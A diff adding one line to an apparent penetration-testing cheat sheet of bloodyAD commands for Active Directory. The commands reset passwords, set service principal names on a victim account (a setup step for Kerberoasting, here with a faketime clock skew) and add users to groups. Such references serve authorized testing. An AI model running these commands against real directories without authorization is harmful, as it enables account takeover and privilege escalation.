@@ -4592,6 +4592,7 @@ bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>        // Set a password for a user
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                             // Set a Service Principal Name (SPN)
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
+faketime 'now + 8 hours' bloodyAD -d <RHOST> --host <FQDN> --dc-ip <IP> -u svc_ldap -p <PASSWORD> -k  set object 'victin_name' servicePrincipalName	// Set a Service Principal Name (SPN) using Kerberos
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                            // Add user to a group using Kerberos
